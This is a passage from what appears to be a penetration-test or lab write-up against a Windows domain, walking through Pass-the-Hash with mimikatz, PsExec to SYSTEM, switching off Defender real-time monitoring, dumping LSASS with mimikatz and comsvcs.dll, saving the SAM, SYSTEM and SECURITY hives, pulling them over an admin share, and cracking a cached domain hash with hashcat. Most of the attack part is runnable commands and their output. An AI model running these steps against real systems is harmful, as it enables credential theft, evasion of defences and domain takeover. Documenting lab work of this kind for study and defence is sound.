> NTLM hash for the local `admin` account was extracted from `IT-TRACK01`.

#### Remote Authentication via Pass-the-Hash (Local Account)

`SeDenyNetworkLogonRight = Administrator` blocks WinRM for the `Administrator` account. PsExec is used to run a remote process as `NT AUTHORITY\SYSTEM` instead.

```powershell
# Launch a Pass-the-Hash session from IT-EMPLOYEE15
.\mimikatz.exe "sekurlsa::pth /user:admin /domain:SYSLOG01 /ntlm:REDACTED_SECRET /run:powershell" "exit"

# Allow WinRM connections to the target host
winrm set winrm/config/client '@{TrustedHosts="*"}'

# SYSTEM — use PsExec to spawn a process as SYSTEM
.\PsExec64.exe \\10.200.6.197 -i -s powershell

# ADMIN — create authenticated remote session with the injected context
$secsyslog = New-PSSession 10.200.6.197 -Authentication Negotiate

# Interactive access
Enter-PSSession $secsyslog
```

> Access to `SEC-SYSLOG01` is established without any domain trust, by abusing Pass-the-Hash against the local account `SECSYSLOG01\admin`. Local NTLM authentication does not depend on Active Directory trust relationships, allowing valid WinRM sessions between completely isolated domains.

## ENUMERATION

| Security Controls | OS Enumeration | Current Context |
| --- | --- | --- |
| - Microsoft Defender AV active (`WinDefend` and `WdNisSvc` running) with Realtime Protection enabled.<br>- Tamper Protection disabled — `Set-MpPreference` can modify Defender preferences.<br>- AMSI active (`DisableScriptScanning=False`, `DisableIOAVProtection=False`) — PowerShell scripts may be inspected.<br>- PowerShell in Constrained Language Mode (CLM) — affects PowerShell only, not .NET executables.<br>- Transcription enabled (`C:\Transcripts`) — executed commands may be recorded in plaintext.<br>- Sysmon active — process, network, and file creation telemetry may be generated.<br>- Firewall disabled in all profiles (`Domain`, `Private`, `Public`).<br>- AppLocker and WDAC enforced — restrictions on binaries, scripts, and .NET components.<br>- At least one active ASR rule (`d1e49aac-8f56-4280-b9ba-993a6d77406c`).<br>- Credential Guard disabled (`REDACTED_SECRET`); LSA Protection not configured — direct LSASS access possible. | - Windows Server 2019 Datacenter (`10.0.17763.379`) x64<br>- Hostname: `SEC-SYSLOG01`<br>- Network: `10.200.6.0/24`, IP `10.200.6.197`, gateway `10.200.6.254`<br>- Exposed services: `135 (RPC)`, `139/445 (SMB)`, `5985 (WinRM)`, dynamic RPC `49664–49670`<br>- Previous session observed for domain user `syslogagent`<br>- Local and domain profiles: `Administrator`, `admin`, `secadmin`, `secadminlocal`, `logagent`, `syslogagent`<br>- Active SMB connections to `10.200.5.15` and `10.200.5.19`<br>- Outbound HTTPS to `10.200.5.19:443`<br>- Persistent connection to `10.200.7.100:5044` (possible SIEM / Logstash) | - Current context: `NT AUTHORITY\SYSTEM`<br>- Member of `BUILTIN\Administrators`, `Everyone`, `Authenticated Users`<br>- Integrity level: `System Mandatory Level`<br>- Relevant enabled privileges: `SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeTcbPrivilege`<br>- Local administrators: `admin`, `Administrator`, `SEC\Domain Admins`, `SEC\syslogagent`, `secadminlocal`<br>- No members in `Remote Desktop Users` or `Remote Management Users`<br>- Standard admin shares available: `ADMIN$`, `C$`, `IPC$` |

#### AppLocker Policy

| Collection | Enforcement | Allow Rules | Deny Rules | Scope |
| --- | --- | --- | --- | --- |
| EXE | Enforced | Must be digitally signed. Microsoft-signed binaries allowed (except PROCDUMP). | Explicit hash-based denies for LOLBins: `cscript.exe`, `wscript.exe`, `mshta.exe`, `regsvr32.exe`, `wmic.exe`, `powershell.exe`, `bitsadmin.exe`, `cmstp.exe`, etc. | Everyone (`S-1-1-0`) |
| DLL | Enforced | Signed by any trusted publisher OR located in `%WINDIR%\*`. | No explicit deny rules. | Everyone (`S-1-1-0`) |
| SCRIPT | Enforced | Only Microsoft-signed scripts (`O=MICROSOFT CORPORATION`). | Unsigned or third-party-signed scripts blocked. | Everyone (`S-1-1-0`) |
| MSI | Enforced | Only signed MSI installers. | Unsigned MSI implicitly blocked. | Everyone (`S-1-1-0`) |
| APPX | Enforced | Only signed APPX/MSIX packages. | Unsigned packages implicitly blocked. | Everyone (`S-1-1-0`) |

> Although AppLocker rules apply to Everyone (`S-1-1-0`), once execution is obtained as `NT AUTHORITY\SYSTEM` via PsExec, execution restrictions no longer affect the attacker-controlled process.

```
AppLocker protects users
↓
but execution as SYSTEM
↓
bypasses most restrictions
```

## ATTACK CHAIN

LSASS dump → recover `syslogagent` credentials → authenticate as Enterprise Admin in `gcbsec.example` → access the Domain Controller → validate privileges and full domain control

## EXPLOITATION

### Credential Dumping from LSASS

Running as `NT AUTHORITY\SYSTEM` with LSA Protection (RunAsPPL) not enabled, LSASS memory is accessible for credential extraction.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

```powershell
.\mimikatz_2_1_1.exe  "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"
# Username : syslogagent
# NTLM     : REDACTED_HASH
# Username : SEC-SYSLOG01$
# NTLM     : REDACTED_HASH

lsadump::secrets
# Secret  : _SC_SNMPTRAP / service 'SNMPTRAP' with username : sec\syslogagent
# cur/text: REDACTED_SECRET
```

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

The `SNMPTRAP` service runs under the domain account `sec\syslogagent`. The cleartext password `REDACTED_SECRET` confirms credential reuse of domain credentials within the compromised host.

#### Alternative — LSASS Dump via LOLBIN

```powershell
# Get LSASS PID
tasklist /FI "IMAGENAME eq lsass.exe"

# Dump LSASS using comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump pid C:\lsass.dmp full
```

### Alternative — Credential Extraction via Registry Hives (Offline)

> If LSASS is not accessible, dump the registry hives instead.

With local administrator privileges, system secrets can be extracted by exporting registry hives — a native OS operation that does not require additional tooling.

#### 1. Export Registry Hives

- `SAM` — local account hashes
- `SYSTEM` — decryption keys for secrets
- `SECURITY` — cached domain credentials (MSCache)

```powershell
# Export critical registry hives
reg save hklm\sam sam.hiv
reg save hklm\system system.hiv
reg save hklm\security security.hiv

# Verify integrity (optional)
Get-FileHash .\sam.hiv -Algorithm MD5
Get-FileHash .\system.hiv -Algorithm MD5
Get-FileHash .\security.hiv -Algorithm MD5
```

#### 2. Hive Exfiltration

```powershell
# Retrieve exported hives from SEC-SYSLOG01 over SMB (admin share)
cp '\\10.200.6.197\C$\Windows\Temp\system.hiv' C:\
cp '\\10.200.6.197\C$\Windows\Temp\sam.hiv' C:\
cp '\\10.200.6.197\C$\Windows\Temp\security.hiv' C:\
```

#### 3. Offline Credential Extraction

```powershell
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
# Administrator:500:REDACTED_HASH:REDACTED_HASH:::
# secadminlocal:1003:REDACTED_HASH:REDACTED_HASH:::
# admin:1006:REDACTED_HASH:REDACTED_HASH:::
# gcbsec.example/syslogagent:$DCC2$10240#syslogagent#REDACTED_HASH
```

A DCC2 hash (MSCache v2) for domain user `syslogagent` is present — this represents a locally cached domain credential, crackable offline via dictionary attack.

#### 4. MSCache v2 Hash Cracking

```bash
# Save the extracted hash
nano mscachev2.hash
$DCC2$10240#syslogagent#REDACTED_HASH

# Dictionary attack
hashcat -a 0 -m 2100 mscachev2.hash /usr/share/wordlists/rockyou.txt

# Show result
hashcat -a 0 -m 2100 mscachev2.hash --show
# REDACTED_SECRET
```
